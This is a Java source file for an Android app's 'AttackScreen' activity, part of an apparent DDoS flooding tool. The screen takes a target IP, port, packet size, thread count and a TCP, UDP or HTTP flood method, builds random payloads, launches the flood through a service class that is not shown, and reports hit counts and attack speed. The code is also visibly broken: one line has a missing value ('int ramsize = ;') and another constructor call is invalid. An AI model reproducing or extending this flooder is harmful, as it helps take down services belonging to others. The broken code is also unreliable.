package com.notebook.idealabs.ddosbandwidththrottlelite;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;
import android.content.pm.ConfigurationInfo;

import java.util.Random;

public class AttackScreen extends Activity {
    private dosService dosSer = new dosService();
    String Target_Ip;
    protected PowerManager.WakeLock mWakeLock;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attack_screen);
        Bundle extras = getIntent().getExtras();
        if (extras != null) {
            Target_Ip = extras.getString("Target");
            this.mWakeLock = ((PowerManager) getSystemService(POWER_SERVICE)).newWakeLock(6, ":DOSLock");
            ConfigurationInfo configurationInfo;
            configurationInfo = new ConfigurationInfo(ActivityManager.MemoryInfo);
        }
    }

    public void startClicked(View v) {
        this.mWakeLock.acquire(600000);
        Spinner Progress = findViewById(R.id.Method);
        EditText Timeout = findViewById(R.id.Timeout);
        EditText Port_no = findViewById(R.id.Port_No);
        EditText Packet_size = findViewById(R.id.Packet_Size);
        EditText Thread_Count = findViewById(R.id.Thread_Count);
        final Button b = (Button) v;

        String check = null;
        String check1 = null;
        String check2 = null;
        String check3 = null;
        boolean Flag = true;
        try {
            check = Timeout.getText().toString();
            check1 = Port_no.getText().toString();
            check2 = Packet_size.getText().toString();
            check3 = Thread_Count.getText().toString();
        } catch (Exception e) {
            Toast.makeText(this, "Please Enter all Values", Toast.LENGTH_SHORT).show();
        }
        if (check == null || check.equals(""))
            Timeout.setError("This Field Needs To Be filled");
        else if (check1 == null || check1.equals(""))
            Port_no.setError("This Field Needs To Be filled");
        else if (check2 == null || check2.equals(""))
            Packet_size.setError("This Field Needs To Be filled");
        else if (check3 == null || check3.equals(""))
            Thread_Count.setError("This Field Needs To Be filled");
        else
            Flag = false;
        if(Flag)
            return;

        Progress.setEnabled(false);

        if (dosService.firing) {
            this.dosSer.stop();
            b.setText(R.string.attackstart);
            Progress.setEnabled(true);
            Thread_Count.setFocusable(true);
            Thread_Count.setFocusableInTouchMode(true);
            return;
        }
        String[] letters = new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"};
        Random rnd = new Random();
        String message = "";
        int size,Threads,timeout;
        try {
            size = Integer.parseInt(Packet_size.getText().toString());
            Threads = Integer.parseInt(Thread_Count.getText().toString());
            timeout = Integer.parseInt(Timeout.getText().toString());
        }catch (Exception e){
            size = 1024;
            Threads = 3;
            timeout = 14000;
        }

        //Todo ; Get Ram Size
        int ramsize = ;
        if(size*Threads*1024 > ramsize/4){
            Threads = (ramsize/4)/size;
            Toast.makeText(this, "Setting Threads to "+Threads+" : Memory Constraints", Toast.LENGTH_SHORT);
        }

        while (size > 0) {
            message = message.concat(letters[rnd.nextInt(letters.length)]);
            size--;
        }

        final byte[] packet = message.getBytes();
        final int method = Progress.getSelectedItemPosition();
        try {
            this.dosSer.DDOS(Target_Ip, Integer.parseInt(Port_no.getText().toString()), method, Threads, timeout, message, 10);
            b.setText(R.string.attackstop);
            new Thread(new Runnable() {
                public void run() {
                    final TextView hit_id = AttackScreen.this.findViewById(R.id.ph);
                    final TextView elapsed_time_id = AttackScreen.this.findViewById(R.id.time);
                    final TextView packetsPerSec_id = AttackScreen.this.findViewById(R.id.pps);
                    final TextView attack_speed_id = AttackScreen.this.findViewById(R.id.dr);
                    while (dosService.firing) {
                        switch (method) {
                            case 0:
                                AttackScreen.this.runOnUiThread(new Runnable() {
                                    public void run() {
                                        elapsed_time_id.setText("" + (((double) (System.currentTimeMillis() - TCP.startTime)) / 1000.0d) + "s");
                                        hit_id.setText("" + TCP.count);
                                        packetsPerSec_id.setText("" + Math.round(((double) TCP.count) / (((double) (System.currentTimeMillis() - TCP.startTime)) / 1000.0d)));
                                        attack_speed_id.setText("" + (((long) (packet.length / 1024)) * Math.round(((double) TCP.count) / (((double) (System.currentTimeMillis() - TCP.startTime)) / 1000.0d))) + " kB/s");
                                    }
                                });
                                break;
                            case 1:
                                AttackScreen.this.runOnUiThread(new Runnable() {
                                    public void run() {
                                        elapsed_time_id.setText("" + (((double) (System.currentTimeMillis() - UDP.startTime)) / 1000.0d) + "s");
                                        hit_id.setText("" + UDP.count);
                                        packetsPerSec_id.setText("" + Math.round(((double) UDP.count) / (((double) (System.currentTimeMillis() - UDP.startTime)) / 1000.0d)));
                                        attack_speed_id.setText("" + (((long) (packet.length / 1024)) * Math.round(((double) UDP.count) / (((double) (System.currentTimeMillis() - UDP.startTime)) / 1000.0d))) + " kB/s");
                                    }
                                });
                                break;
                            case 2:
                                AttackScreen.this.runOnUiThread(new Runnable() {
                                    public void run() {
                                        elapsed_time_id.setText("" + (((double) (System.currentTimeMillis() - HTTP.startTime)) / 1000.0d) + "s");
                                        hit_id.setText("" + HTTP.count);
                                        packetsPerSec_id.setText("" + Math.round(((double) HTTP.count) / (((double) (System.currentTimeMillis() - HTTP.startTime)) / 1000.0d)));
                                        attack_speed_id.setText("" + (((long) "GET / HTTP/1.1".getBytes().length) * Math.round(((double) HTTP.count) / (((double) (System.currentTimeMillis() - HTTP.startTime)) / 1000.0d))) + " Byte/s");
                                    }
                                });
                                break;
                        }

                        if (dosService.error) {
                            AttackScreen.this.dosSer.stop();
                            elapsed_time_id.setText("" + (((double) (System.currentTimeMillis() - TCP.startTime)) / 1000.0d) + "s");
                            hit_id.setText("Something went wrong");
                            packetsPerSec_id.setText("Something went wrong");
                            b.setText(R.string.attackstart);
                        }
                        try {
                            Thread.sleep(50);
                        } catch (Exception e) {
                            Toast.makeText(AttackScreen.this, "Try Entering smaller values for no of threads and packet size", Toast.LENGTH_LONG).show();
                        }
                    }
                    AttackScreen.this.mWakeLock.release();
                }
            }).start();
        } catch (Exception e2) {
            Toast.makeText(this, "Oops, Something went wrong", Toast.LENGTH_SHORT).show();
        }
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.options_menu, menu);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.share_menu_id:
                Intent sendIntent = new Intent();
                sendIntent.setAction("android.intent.action.SEND");
                sendIntent.putExtra("android.intent.extra.TEXT", "Hey check out this new app at: https://play.google.com/store/apps/details?id=" + getPackageName());
                sendIntent.setType("text/plain");
                startActivity(Intent.createChooser(sendIntent, "Share via"));
                return true;
            case R.id.rate_us_menu_id:
                String appPackageName = getPackageName();
                try {
                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("market://details?id=" + appPackageName)));
                    return true;
                } catch (ActivityNotFoundException e) {
                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    return true;
                }
            case R.id.more_apps_menu_id:
                try {
                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("market://developer?id=7665922803421240272")));
                    return true;
                } catch (ActivityNotFoundException e2) {
                    startActivity(new Intent("android.intent.action.VIEW", Uri.parse("https://play.google.com/store/apps/dev?id=7665922803421240272")));
                    return true;
                }
            case R.id.credits:
                startActivity(new Intent("android.intent.action.VIEW", Uri.parse("https://docs.google.com/spreadsheets/d/1cCo5LJhfwjjWM7ampBVkdVHbGHhidSuLJzu1aLkA85o/edit?usp=sharing")));
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    public void onPause() {
        super.onPause();
    }

    public void onResume() {
        super.onResume();
    }

    public void onDestroy() {
        super.onDestroy();
    }
}
